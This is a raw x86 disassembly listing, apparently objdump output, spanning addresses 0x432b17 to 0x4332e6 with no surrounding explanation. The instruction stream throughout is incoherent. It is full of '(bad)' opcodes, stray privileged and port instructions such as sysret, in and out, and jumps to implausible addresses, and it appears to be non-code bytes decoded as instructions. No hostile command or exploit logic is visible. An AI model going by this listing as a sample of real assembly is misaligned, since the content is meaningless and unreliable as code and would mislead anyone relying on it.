  432b17:	push   esi
  432b18:	push   esi
  432b19:	mov    edi,0x7af080f
  432b1e:	add    bh,al
  432b20:	test   DWORD PTR [ebx+0x3a7320f],ebx
  432b26:	add    BYTE PTR [ecx+0x4540100f],cl
  432b2c:	mov    ebp,eax
  432b2e:	mov    ebp,edi
  432b30:	lock call edx
  432b33:	fcom   DWORD PTR [ebp+0x45]
  432b36:	mov    eax,0x148a8b
  432b3b:	push   ecx
  432b3c:	enter  0xc145,0x83
  432b40:	cmp    ecx,DWORD PTR [eax]
  432b42:	add    BYTE PTR [ebp+0x4d],al
  432b45:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  432b4b:	call   0xffa326ba
  432b50:	cmp    eax,DWORD PTR [ebp-0xc]
  432b53:	jmp    DWORD PTR [eax+edx*1-0x4e]
  432b57:	push   ebp
  432b58:	(bad)  
  432b59:	call   0x34295d
  432b5e:	mov    bh,0xdb
  432b60:	cld    
  432b61:	or     BYTE PTR [ebp+0x45],bl
  432b64:	(bad)  
  432b65:	call   0xff7d27f5
  432b6a:	add    al,BYTE PTR [ebp+0x37]
  432b6d:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  432b73:	jne    0x432b75
  432b75:	(bad)  
  432b76:	cmp    edi,esp
  432b78:	jne    0x432bab
  432b7a:	mov    edi,edi
  432b7c:	or     BYTE PTR [ebx-0x307f0b49],cl
  432b82:	pop    ds
  432b83:	into   
  432b84:	je     0x432b47
  432b86:	mov    ebx,DWORD PTR [esi]
  432b88:	or     BYTE PTR [ebp-0x49],al
  432b8b:	mov    esp,DWORD PTR [esi-0x77]
  432b8e:	mov    esi,0x2451f0c
  432b93:	mov    eax,DWORD PTR [eax]
  432b95:	or     al,0x66
  432b97:	sar    bl,0x3b
  432b9a:	xor    esi,DWORD PTR [ebp+0x66]
  432b9d:	xor    ecx,edi
  432b9f:	pop    edi
  432ba0:	adc    bl,BYTE PTR [ebx+0x7e]
  432ba3:	ret    0xff
  432ba6:	cld    
  432ba7:	inc    ebp
  432ba8:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  432bae:	cld    
  432baf:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  432bb6:	push   0xffffff83
  432bb8:	pop    edi
  432bb9:	or     BYTE PTR [ebp+0x53],dh
  432bbc:	xorps  xmm1,xmm2
  432bbf:	test   BYTE PTR [eax+eax*1],bh
  432bc2:	add    BYTE PTR [eax],al
  432bc4:	adc    eax,eax
  432bc6:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  432bce:	jmp    DWORD PTR [eax]
  432bd0:	ror    al,0x5e
  432bd3:	inc    ebp
  432bd4:	leave  
  432bd5:	xor    ecx,DWORD PTR [eax]
  432bd7:	and    DWORD PTR [ebx-0x3ec30708],ecx
  432bdd:	add    ah,al
  432bdf:	xor    edi,edi
  432be1:	xor    DWORD PTR [ebx],0x66003302
  432be7:	mov    DWORD PTR [ebp-0xc],ecx
  432bea:	pcmpgtw mm0,mm0
  432bed:	add    dl,ah
  432bef:	leave  
  432bf0:	mov    edi,DWORD PTR [ebx+eax*4+0x66]
  432bf4:	push   eax
  432bf5:	dec    ebp
  432bf6:	mov    esi,DWORD PTR [ebx-0x75]
  432bf9:	lea    ebp,[eax-0x7c00ff02]
  432bff:	xor    eax,DWORD PTR [eax]
  432c01:	sysret 
  432c03:	dec    ebp
  432c04:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  432c0b:	push   WORD PTR [ecx+0x8]
  432c0f:	jne    0x432bd2
  432c11:	ud0    ecx,DWORD PTR [ecx]
  432c14:	mov    eax,edx
  432c16:	lods   al,BYTE PTR ds:[esi]
  432c17:	add    BYTE PTR [eax],al
  432c19:	data16 (bad) 
  432c1b:	iret   
  432c1c:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  432c23:	cli    
  432c24:	inc    ebp
  432c25:	cmp    al,0x8d
  432c27:	add    BYTE PTR [esi+0x2d],ah
  432c2a:	inc    ebp
  432c2b:	pop    ebp
  432c2c:	lea    ecx,[edi]
  432c2e:	mov    dl,bh
  432c30:	add    BYTE PTR [edi],cl
  432c32:	mov    DWORD PTR [eax+eax*8],edi
  432c35:	mov    ebx,0x3b87
  432c3a:	add    BYTE PTR [ebx],ch
  432c3c:	inc    ebp
  432c3d:	data16 (bad) 
  432c3f:	clc    
  432c40:	int3   
  432c41:	cmp    eax,DWORD PTR [eax]
  432c43:	je     0x432bce
  432c45:	push   0xffffffc8
  432c47:	pop    edi
  432c48:	xchg   DWORD PTR [ebp+0x0],eax
  432c4b:	data16 add BYTE PTR [ebp+0x45],cl
  432c4f:	lea    cx,[ebp+0x10]
  432c53:	jb     0x432c55
  432c55:	jmp    0x432be0
  432c57:	call   eax
  432c59:	clc    
  432c5a:	xchg   DWORD PTR [edi+0x1],edi
  432c5d:	mov    eax,DWORD PTR [eax]
  432c5f:	or     BYTE PTR [ebp-0x49],al
  432c62:	lea    eax,[eax+0x74003154]
  432c68:	push   edi
  432c69:	inc    edx
  432c6a:	jge    0x432c6b
  432c6c:	mov    DWORD PTR [edi],ecx
  432c6e:	fdiv   DWORD PTR [edi-0x6]
  432c71:	inc    DWORD PTR [eax]
  432c73:	xor    edx,DWORD PTR [eax+0x5f]
  432c76:	xchg   DWORD PTR [ebx+0x1],ebx
  432c79:	ret    0x0
  432c7c:	xor    BYTE PTR [ebp-0x51],cl
  432c7f:	cmp    edi,0xf0ff89fe
  432c85:	data16 ror al,0x84
  432c89:	rol    BYTE PTR [eax],0x3b
  432c8c:	add    al,dh
  432c8e:	dec    eax
  432c8f:	xchg   esp,eax
  432c90:	push   ebx
  432c91:	jmp    0x432c1e
  432c93:	push   ebp
  432c94:	add    esp,ebp
  432c96:	add    ebp,esp
  432c98:	mov    edx,DWORD PTR [edi+0x24]
  432c9b:	clc    
  432c9c:	dec    esi
  432c9d:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  432ca3:	cmp    BYTE PTR [ebx],al
  432ca5:	jne    0x432c30
  432ca7:	xor    esp,eax
  432ca9:	jmp    0x462e2c
  432cae:	add    ebp,DWORD PTR [ecx+ecx*4]
  432cb1:	jne    0x432ca7
  432cb3:	call   0xffcd2a0d
  432cb8:	clc    
  432cb9:	xchg   edi,eax
  432cba:	sti    
  432cbb:	add    DWORD PTR [ebx],eax
  432cbd:	add    BYTE PTR [ebp+0x47],bl
  432cc0:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  432cc6:	pop    ebp
  432cc7:	mov    DWORD PTR [esi-0x48],esi
  432cca:	jmp    0x432d13
  432ccc:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  432cd2:	(bad)  
  432cd4:	cmp    al,0x0
  432cd6:	cmp    eax,DWORD PTR [ebp+0x18]
  432cd9:	lea    ebx,[ebp-0x56]
  432cdc:	jle    0x432cde
  432cde:	jae    0x432c69
  432ce0:	mov    eax,esp
  432ce2:	call   0xb900:0x8b005587
  432ce9:	inc    ebp
  432cea:	push   ebp
  432ceb:	lea    ecx,[ebp-0x27ff4f12]
  432cf1:	mov    eax,edi
  432cf3:	int3   
  432cf4:	push   ebp
  432cf5:	xchg   edi,eax
  432cf7:	add    esp,ebp
  432cf9:	add    BYTE PTR [eax],al
  432cfb:	inc    ebp
  432cfc:	add    BYTE PTR [ebp+0x8b3255],cl
  432d02:	cld    
  432d03:	mov    DWORD PTR [edx],edi
  432d05:	aam    0x75
  432d07:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  432d0d:	mov    DWORD PTR [ebx-0x50],edx
  432d10:	test   BYTE PTR [ebp-0x1],0xe8
  432d14:	mov    eax,DWORD PTR [eax]
  432d16:	hlt    
  432d17:	add    al,al
  432d19:	mov    eax,DWORD PTR ds:0x890045a8
  432d1f:	dec    DWORD PTR [ebx+0x45fdf0e8]
  432d25:	inc    DWORD PTR [eax*2+0xf75854d]
  432d2c:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  432d32:	call   0x72998a73
  432d37:	je     0x432d97
  432d39:	js     0x432d9a
  432d3b:	lock ret 0x7e
  432d3f:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  432d45:	mov    edi,edi
  432d47:	sbb    al,bl
  432d49:	clc    
  432d4a:	add    BYTE PTR [ebp-0x73],bh
  432d4d:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  432d53:	ror    BYTE PTR [eax],1
  432d55:	dec    ebp
  432d56:	xchg   ebp,eax
  432d57:	mov    edi,edi
  432d59:	in     al,0x8b
  432d5b:	jge    0x432ce6
  432d5d:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  432d63:	clc    
  432d64:	pop    esi
  432d65:	fist   DWORD PTR [ebp+0x5d398b5d]
  432d6b:	clc    
  432d6c:	add    al,0x6e
  432d6e:	mov    eax,DWORD PTR [ebx]
  432d70:	mov    BYTE PTR [ebp+0x0],dl
  432d73:	mov    edx,DWORD PTR [ebx-0x20]
  432d76:	adc    esi,DWORD PTR [edi+0x5e005f3c]
  432d7c:	add    eax,0x3b3b73
  432d81:	adc    al,0x89
  432d83:	pop    eax
  432d84:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  432d88:	ret    0xf08
  432d8b:	cmp    al,0x2
  432d8d:	mov    edx,eax
  432d8f:	cld    
  432d90:	add    BYTE PTR [ebp+0x66],dl
  432d93:	add    eax,ebx
  432d95:	add    esp,eax
  432d97:	sub    eax,eax
  432d99:	or     BYTE PTR [ecx-0x77f474bb],cl
  432d9f:	add    BYTE PTR [eax],al
  432da1:	mov    DWORD PTR [ebx-0x24],ebx
  432da4:	push   edi
  432da5:	push   ebp
  432da6:	clc    
  432da7:	add    DWORD PTR [esi+0x1b0100],0x45
  432dae:	out    0xff,eax
  432db0:	add    edx,DWORD PTR [eax]
  432db2:	jmp    0x432d9c
  432db4:	cmp    ch,0x46
  432db7:	(bad)  
  432db8:	jmp    0x40c8b60a
  432dbd:	je     0x432d49
  432dbf:	mov    eax,DWORD PTR [eax-0x10c78104]
  432dc5:	inc    ebp
  432dc6:	add    BYTE PTR [ebx-0x770375],al
  432dcc:	add    ah,ch
  432dce:	add    edx,esp
  432dd0:	pop    edi
  432dd1:	pop    ebp
  432dd2:	push   ebp
  432dd3:	inc    ebx
  432dd4:	in     al,dx
  432dd5:	pop    ebp
  432dd6:	in     al,dx
  432dd7:	cmp    edx,DWORD PTR [edi-0x8]
  432dda:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  432de1:	add    al,0x47
  432de3:	push   ebp
  432de4:	mov    esp,ebp
  432de6:	in     al,0x45
  432de8:	dec    ebp
  432de9:	push   esi
  432dea:	test   DWORD PTR [eax+0xfb010f],esi
  432df0:	add    BYTE PTR [eax+0xc018b],dh
  432df6:	leave  
  432df7:	inc    ebp
  432df8:	test   al,ch
  432dfa:	add    dh,bh
  432dfc:	add    bh,bh
  432dfe:	dec    ebp
  432dff:	push   cs
  432e00:	mov    DWORD PTR [ecx],eax
  432e02:	hlt    
  432e03:	push   es
  432e04:	dec    ebp
  432e05:	leave  
  432e06:	mov    DWORD PTR [eax],ecx
  432e08:	clc    
  432e09:	cmovge eax,ecx
  432e0c:	mov    ecx,0x85c2f0
  432e12:	clc    
  432e13:	pop    DWORD PTR [ebp+0x1]
  432e16:	push   ebx
  432e17:	add    BYTE PTR [ebp-0x15],bh
  432e1a:	push   esi
  432e1b:	xor    eax,0x898a45
  432e20:	cld    
  432e21:	add    al,BYTE PTR [ebp+0x0]
  432e24:	xor    esp,DWORD PTR [esi-0x64]
  432e27:	add    DWORD PTR [esi+0x78308c1],edi
  432e2d:	add    ah,BYTE PTR [ebp-0x49]
  432e30:	int    0xbb
  432e32:	mov    ecx,DWORD PTR [esi+0xc]
  432e35:	add    dh,al
  432e37:	cmp    ecx,ebx
  432e39:	jne    0x432e03
  432e3b:	xor    ecx,DWORD PTR [ebp+0x66]
  432e3e:	jmp    0xca2e44
  432e43:	add    DWORD PTR [ebp+0x0],eax
  432e46:	mov    eax,ebx
  432e48:	or     al,0x8b
  432e4a:	(bad)  
  432e4b:	mov    ecx,esi
  432e4d:	mov    BYTE PTR [eax+eax*1+0x664c136],cl
  432e54:	mov    eax,edi
  432e56:	or     BYTE PTR [edx],cl
  432e58:	shl    cl,cl
  432e5a:	icebp  
  432e5b:	add    BYTE PTR [ebp+0x38],0x8b
  432e5f:	or     BYTE PTR [edx+eax*2],cl
  432e62:	(bad)  
  432e63:	or     cl,dh
  432e65:	stc    
  432e66:	shl    DWORD PTR [ebp-0x30],0xc6
  432e6a:	xor    al,0x0
  432e6c:	inc    ebp
  432e6d:	xchg   BYTE PTR [ebx],al
  432e6f:	add    esp,edi
  432e71:	add    BYTE PTR [ebp-0x39],cl
  432e74:	mov    al,bl
  432e76:	test   DWORD PTR [ebx+0x1c348375],ecx
  432e7c:	sub    al,0xbf
  432e7e:	jmp    0x432e05
  432e80:	mov    edi,eax
  432e82:	lock jge 0x432e76
  432e85:	lea    esi,[edx-0x74bad5ff]
  432e8b:	mov    ebp,esp
  432e8d:	or     cl,dh
  432e8f:	leave  
  432e90:	add    al,BYTE PTR [eax+eax*4-0x37ff9b00]
  432e97:	dec    ebp
  432e98:	dec    ebp
  432e99:	test   DWORD PTR [ebx],eax
  432e9b:	paddb  mm6,mm0
  432e9e:	add    DWORD PTR [eax],eax
  432ea0:	dec    ebp
  432ea1:	mov    ecx,DWORD PTR [ebx-0x64b217f0]
  432ea7:	mov    esi,DWORD PTR [edx]
  432ea9:	or     al,0x2b
  432eab:	dec    ebp
  432eac:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  432eb2:	mov    esp,edi
  432eb4:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  432ebb:	mov    DWORD PTR [ebx],ebp
  432ebd:	call   0xc76b7ed
  432ec2:	mov    DWORD PTR [ebp+0x10],ecx
  432ec5:	(bad)  
  432ec6:	push   0x8b85ff10
  432ecb:	clc    
  432ecc:	or     al,0x54
  432ece:	(bad)  
  432ecf:	push   ecx
  432ed0:	retf   
  432ed1:	mov    ebx,0xff4d8dc8
  432ed6:	mov    DWORD PTR [ebp+0x8],eax
  432ed9:	xor    eax,DWORD PTR [ebp-0x75]
  432edc:	cmp    ebp,DWORD PTR [ebx]
  432ede:	lsl    ebx,WORD PTR [edi-0x8]
  432ee2:	call   DWORD PTR [ebx-0x741bff75]
  432ee8:	(bad)  
  432ee9:	or     al,0x5b
  432eeb:	dec    ebp
  432eec:	or     BYTE PTR [ebx],dh
  432eee:	inc    ebp
  432eef:	xor    esi,DWORD PTR ds:0x708088d
  432ef5:	in     eax,0x9b
  432ef7:	add    BYTE PTR [edx],dh
  432ef9:	inc    ebp
  432efa:	pop    edi
  432efb:	xor    eax,edx
  432efd:	test   DWORD PTR [eax],0x81108b8b
  432f03:	dec    ebp
  432f04:	sub    al,0x33
  432f06:	add    BYTE PTR [ebx],dh
  432f08:	push   esi
  432f09:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  432f0f:	mov    edi,eax
  432f11:	or     BYTE PTR [ebp+0x45],al
  432f14:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  432f1a:	xor    ecx,ecx
  432f1c:	pushf  
  432f1d:	push   es
  432f1e:	mov    DWORD PTR [esi-0x4],0xf8178538
  432f25:	dec    ebp
  432f26:	inc    ebp
  432f27:	cmp    BYTE PTR [ecx],0x54
  432f2a:	pushf  
  432f2b:	gs (bad) 
  432f2d:	shl    esp,1
  432f2f:	dec    ebp
  432f30:	xchg   BYTE PTR [eax-0x3dbaab08],al
  432f36:	shr    ecx,1
  432f38:	xlat   BYTE PTR ds:[ebx]
  432f39:	rol    bh,cl
  432f3b:	mov    edx,esp
  432f3d:	or     BYTE PTR [ebp+0x4588f84d],al
  432f43:	mov    ecx,DWORD PTR [eax]
  432f45:	or     BYTE PTR [eax],al
  432f47:	push   ebp
  432f48:	mov    edi,DWORD PTR [eax+0xfc728b]
  432f4e:	dec    ebp
  432f4f:	enter  0xceba,0x8
  432f53:	retf   0x1807
  432f56:	ret    0x9b4d
  432f59:	mov    esi,DWORD PTR [edx]
  432f5b:	or     al,0x33
  432f5d:	into   
  432f5e:	add    edx,esi
  432f60:	add    ecx,edx
  432f62:	bswap  eax
  432f64:	ror    esi,0x98
  432f67:	dec    ebp
  432f68:	add    cl,ch
  432f6a:	mov    edi,edi
  432f6c:	hlt    
  432f6d:	inc    esi
  432f6f:	inc    ebp
  432f70:	ret    0x4533
  432f73:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  432f79:	or     BYTE PTR [ebx],dh
  432f7b:	dec    ebp
  432f7c:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  432f82:	jne    0xff8d2f49
  432f88:	inc    ebp
  432f89:	inc    ebp
  432f8a:	mov    esi,DWORD PTR [ebx]
  432f8c:	clc    
  432f8d:	pop    esi
  432f8e:	ret    0xcaeb
  432f91:	mov    eax,esi
  432f93:	call   0x52048466
  432f98:	dec    ebp
  432f99:	add    eax,0xf8728b
  432f9e:	adc    eax,0xce0ccac9
  432fa3:	push   ebp
  432fa4:	ret    0xc6ec
  432fa7:	in     al,dx
  432fa8:	call   0x33437cb1
  432fad:	push   edi
  432fae:	add    edi,eax
  432fb0:	xor    eax,eax
  432fb2:	jmp    0x432ff9
  432fb4:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  432fba:	add    eax,edi
  432fbc:	shr    eax,cl
  432fbe:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  432fc4:	mov    esi,DWORD PTR [edx]
  432fc6:	in     al,dx
  432fc7:	pushf  
  432fc8:	ret    0x84c7
  432fcb:	fcomp  DWORD PTR [ebx-0x7607cd7b]
  432fd1:	inc    ebp
  432fd2:	in     al,dx
  432fd3:	xor    DWORD PTR [ebp-0x64],eax
  432fd6:	mov    eax,edi
  432fd8:	cld    
  432fd9:	fmul   st(2),st
  432fdb:	sbb    dl,al
  432fdd:	jmp    0x9c3b:0x304d45c1
  432fe4:	jbe    0x432fad
  432fe6:	mov    esp,eax
  432fe8:	clc    
  432fe9:	add    BYTE PTR [ebp+0x0],cl
  432fec:	mov    ecx,ecx
  432fee:	lea    eax,[ebp-0x5]
  432ff1:	mov    edi,edi
  432ff3:	call   0x51ce843d
  432ff8:	hlt    
  432ff9:	xor    eax,edx
  432ffb:	mov    esi,0x9b7284
  433000:	xor    cl,dl
  433002:	mov    esi,eax
  433004:	hlt    
  433005:	into   
  433006:	inc    ebp
  433007:	scas   eax,DWORD PTR es:[edi]
  433008:	mov    ebp,ecx
  43300a:	cld    
  43300b:	add    dl,cl
  43300d:	add    dl,al
  43300f:	inc    ebp
  433010:	shr    DWORD PTR [ebx],0x4d
  433013:	xor    edi,DWORD PTR [ebx]
  433015:	mov    DWORD PTR [edi],ecx
  433017:	clc    
  433018:	dec    esi
  433019:	inc    ebp
  43301a:	dec    DWORD PTR [ebx-0x3d2b1775]
  433020:	ret    0xc6ca
  433023:	mov    BYTE PTR [ebp-0x32],0x53
  433027:	scas   eax,DWORD PTR es:[edi]
  433028:	inc    ebp
  433029:	jmp    0x43305b
  43302b:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  433032:	pop    ebx
  433033:	xor    ecx,DWORD PTR [ebp+0x3]
  433036:	mov    eax,DWORD PTR [ebx]
  433038:	clc    
  433039:	test   edx,ecx
  43303b:	mov    ecx,esi
  43303d:	cld    
  43303e:	call   0x8ab77588
  433043:	xor    ecx,DWORD PTR [eax+0x4533f303]
  433049:	add    ecx,DWORD PTR [ebx-0x4974072d]
  43304f:	fdiv   QWORD PTR [ebx]
  433051:	retf   0xce89
  433054:	in     al,0xc1
  433056:	inc    ebp
  433057:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  43305d:	into   
  43305e:	mov    dh,0xc1
  433061:	call   0x8c1775ea
  433066:	(bad)  
  433067:	cld    
  433068:	mov    ecx,DWORD PTR [ebp-0x14]
  43306b:	xor    eax,ecx
  43306d:	lea    eax,[ebp+0x8]
  433070:	mov    esi,DWORD PTR [edx-0x4]
  433073:	add    dl,al
  433075:	inc    ebp
  433076:	mov    esp,0x32d89b8b
  43307b:	dec    ebp
  43307c:	mov    esi,DWORD PTR [ebx]
  43307e:	cld    
  43307f:	xor    eax,edx
  433081:	sub    esp,DWORD PTR [ebp-0x75]
  433084:	int    0xec
  433086:	sub    ecx,eax
  433088:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  43308e:	mov    esi,esp
  433090:	call   0x34177e19
  433095:	inc    DWORD PTR [ebx]
  433097:	mov    edi,DWORD PTR [ebx]
  433099:	cld    
  43309a:	jne    0x4330e9
  43309c:	mov    esi,DWORD PTR [ebx]
  43309e:	aam    0x8d
  4330a0:	dec    ebp
  4330a1:	or     BYTE PTR [ebx],dh
  4330a3:	jb     0x4330a8
  4330a5:	add    BYTE PTR [edi+0x45],bl
  4330a8:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  4330af:	xor    ebp,esp
  4330b1:	xor    eax,edi
  4330b3:	sub    edi,esp
  4330b5:	mov    eax,DWORD PTR [ebp+0x32c8f8f4]
  4330bb:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  4330c2:	inc    ebp
  4330c3:	xor    ecx,DWORD PTR [ecx+0x45891403]
  4330c9:	clc    
  4330ca:	mov    eax,edi
  4330cc:	nop
  4330cd:	fadd   QWORD PTR [eax]
  4330cf:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  4330d5:	jmp    0x433060
  4330d7:	mov    eax,DWORD PTR [ecx]
  4330d9:	fadd   DWORD PTR [eax]
  4330db:	inc    ebp
  4330dc:	or     DWORD PTR [ebx],esi
  4330de:	dec    eax
  4330df:	add    edx,DWORD PTR [ebx-0x2d]
  4330e2:	dec    ebp
  4330e3:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  4330e9:	inc    ebp
  4330ea:	push   esp
  4330eb:	mov    dl,BYTE PTR [ecx-0xd]
  4330ee:	xor    ecx,DWORD PTR [ebp-0x45]
  4330f1:	(bad)  
  4330f3:	rol    BYTE PTR [eax],0xc1
  4330f6:	ret    
  4330f7:	inc    ebp
  4330f8:	inc    ebp
  4330f9:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  4330ff:	xor    eax,ebx
  433101:	add    eax,DWORD PTR [ebp+0x23]
  433104:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  43310a:	cmp    edi,0xc
  43310d:	dec    ebp
  43310e:	inc    ebp
  43310f:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  433115:	inc    ebp
  433116:	mov    esi,DWORD PTR [ebx]
  433118:	clc    
  433119:	lea    eax,[ebp+0x45725407]
  43311f:	add    BYTE PTR [ebp+eax*2-0x75],dh
  433123:	xor    edi,DWORD PTR [eax]
  433125:	mov    ecx,0xff8b8d4d
  43312a:	push   esp
  43312b:	enter  0x4df7,0x23
  43312f:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  433135:	mov    eax,DWORD PTR [ebx]
  433137:	loopne 0x433124
  433139:	ret    0xc68b
  43313c:	push   esp
  43313d:	enter  0x9745,0x8b
  433141:	inc    ebp
  433142:	cld    
  433143:	mov    eax,edi
  433145:	clc    
  433146:	ret    
  433147:	ret    0xc645
  43314a:	mov    esi,DWORD PTR [ebx]
  43314c:	cld    
  43314d:	pop    esi
  43314e:	mov    ebx,0x83458bc3
  433154:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  433158:	dec    ebp
  433159:	xor    DWORD PTR [ebx],esi
  43315b:	pushf  
  43315c:	add    edi,DWORD PTR [edx-0x7767a77]
  433162:	fcom   DWORD PTR [ebp+0x45]
  433165:	mov    esi,DWORD PTR [ebx]
  433167:	adc    al,0x9c
  433169:	inc    ebp
  43316a:	(bad)  
  43316b:	mov    ebx,eax
  43316d:	adc    al,0x85
  43316f:	cmp    al,0x1
  433172:	inc    ebp
  433173:	add    BYTE PTR ds:0xe98b9c4d,bh
  433179:	mov    eax,DWORD PTR [ebx]
  43317b:	nop
  43317c:	add    BYTE PTR [eax],al
  43317e:	inc    ebp
  43317f:	mov    esi,DWORD PTR [ebx]
  433181:	add    eax,DWORD PTR [ebx]
  433183:	cmp    al,0x89
  433185:	mov    esp,esi
  433187:	clc    
  433188:	inc    ebp
  433189:	inc    ebp
  43318a:	add    edx,DWORD PTR [esi+0xc]
  43318d:	mov    edi,0x7ff0845
  433192:	in     al,dx
  433193:	(bad)  
  433194:	jne    0x433131
  433196:	mov    esi,DWORD PTR [edx]
  433198:	clc    
  433199:	add    ebp,DWORD PTR [esi]
  43319b:	mov    edi,edi
  43319d:	in     al,dx
  43319e:	mov    DWORD PTR [ebp-0x10],eax
  4331a1:	xor    eax,DWORD PTR [ebp+0x3]
  4331a4:	cmp    DWORD PTR [ecx+0x458bf49c],ecx
  4331aa:	fmul   DWORD PTR [ebx-0x173caf39]
  4331b0:	lea    ecx,[ecx+0x45e8d4bc]
  4331b6:	clc    
  4331b7:	mov    edi,edi
  4331b9:	cmp    BYTE PTR [ebp+0x4d],al
  4331bc:	test   DWORD PTR [eax+0x74],ecx
  4331bf:	inc    ecx
  4331c0:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  4331c6:	ret    
  4331c7:	inc    eax
  4331c8:	dec    DWORD PTR [ebx+0x4945f8f0]
  4331ce:	push   eax
  4331cf:	dec    eax
  4331d0:	test   al,0xd0
  4331d2:	dec    eax
  4331d4:	mov    eax,DWORD PTR [ebp-0x14]
  4331d7:	mov    eax,DWORD PTR [ebp+0x38]
  4331da:	mov    eax,ecx
  4331dc:	fadd   DWORD PTR [ebx]
  4331de:	dec    ebp
  4331df:	inc    eax
  4331e0:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  4331e6:	inc    ebp
  4331e7:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  4331ed:	fadd   QWORD PTR [ebx]
  4331ef:	inc    ebp
  4331f0:	or     al,0x33
  4331f2:	dec    ebp
  4331f3:	add    edi,DWORD PTR [ebx]
  4331f5:	mov    DWORD PTR [edx-0x28],esi
  4331f8:	mov    eax,DWORD PTR [ebp-0x10]
  4331fb:	mov    eax,DWORD PTR [eax+0x10]
  4331fe:	mov    eax,edi
  433200:	lock ret 
  433202:	inc    ecx
  433203:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  433209:	fsubr  st,st(5)
  43320b:	test   DWORD PTR [eax],eax
  43320d:	clc    
  43320e:	push   0x45
  433210:	(bad)  
  433211:	cmp    al,0xec
  433213:	pushf  
  433214:	inc    ebp
  433215:	(bad)  
  433216:	push   eax
  433217:	fsub   DWORD PTR [eax-0x7b]
  43321a:	(bad)  
  43321b:	clc    
  43321c:	mov    eax,0xf8008584
  433221:	mov    eax,DWORD PTR [ebp-0x4]
  433224:	mov    edi,0x4585c3cc
  43322a:	clc    
  43322b:	mov    eax,DWORD PTR [ebp+0x14]
  43322e:	xor    eax,DWORD PTR [ebp-0x64]
  433231:	mov    edi,eax
  433233:	in     al,dx
  433234:	les    esi,FWORD PTR [ebp-0x7b]
  433237:	mov    edi,eax
  433239:	or     al,0x4d
  43323b:	dec    ebp
  43323c:	mov    eax,ebp
  43323e:	in     al,0xf2
  433240:	dec    ebp
  433241:	dec    DWORD PTR [ecx+0x4dc7e045]
  433247:	fmul   DWORD PTR [ecx+0x4df8f085]
  43324d:	inc    ebp
  43324e:	mov    DWORD PTR [ebx],esi
  433250:	fadd   QWORD PTR [ebx]
  433252:	dec    ebp
  433253:	push   eax
  433254:	xor    eax,DWORD PTR [ebp+0x3]
  433257:	push   eax
  433258:	mov    DWORD PTR [eax+ebx*8],ebx
  43325b:	push   esi
  43325d:	mov    eax,DWORD PTR [eax]
  43325f:	lock cmp eax,0xf84e85c0
  433265:	inc    ebp
  433266:	test   BYTE PTR [ebx],dh
  433268:	add    DWORD PTR [ebx],eax
  43326a:	add    BYTE PTR [eax+0x4d],dl
  43326d:	jne    0x4332a2
  43326f:	lea    ecx,[ebx-0x7617fc44]
  433275:	div    ah
  433277:	inc    DWORD PTR [ebp+0x45]
  43327a:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  433280:	jb     0x43320d
  433282:	add    BYTE PTR [eax*2-0x17ba743f],cl
  433289:	mov    ecx,DWORD PTR [ebp-0x10]
  43328c:	xor    ecx,DWORD PTR [ebp+0x3]
  43328f:	mov    edi,DWORD PTR [ebx]
  433291:	adc    BYTE PTR [ebp+0x41],dh
  433294:	mov    ecx,DWORD PTR [ebx-0x37382704]
  43329a:	ret    
  43329b:	push   ss
  43329c:	push   0x45
  43329e:	lea    ecx,[ebx+0x4de80cb0]
  4332a4:	sti    
  4332a5:	add    edi,edi
  4332a7:	or     BYTE PTR [ebp+0x4d],al
  4332aa:	mov    ebp,DWORD PTR [ebx]
  4332ac:	xor    ebp,ecx
  4332ae:	mov    al,BYTE PTR [edx]
  4332b0:	add    eax,0xc7200
  4332b5:	jne    0x433304
  4332b7:	lea    esi,[ebx]
  4332b9:	mov    al,0xf
  4332bb:	call   0xf2980
  4332c0:	shl    DWORD PTR [ecx],0x84
  4332c3:	pushf  
  4332c4:	add    DWORD PTR [ecx+0x4545d000],ecx
  4332ca:	mov    esi,DWORD PTR [edx]
  4332cc:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  4332d3:	test   DWORD PTR [eax],eax
  4332d5:	clc    
  4332d6:	dec    ebp
  4332d7:	inc    ebp
  4332d8:	xor    edi,DWORD PTR [edi+ecx*1]
  4332db:	pushf  
  4332dc:	ror    BYTE PTR [ebp+0x4dc1d0cb],0x84
  4332e3:	lea    eax,[ecx]
  4332e5:	int3   
  4332e6:	add    BYTE PTR [ebp+0x45],cl
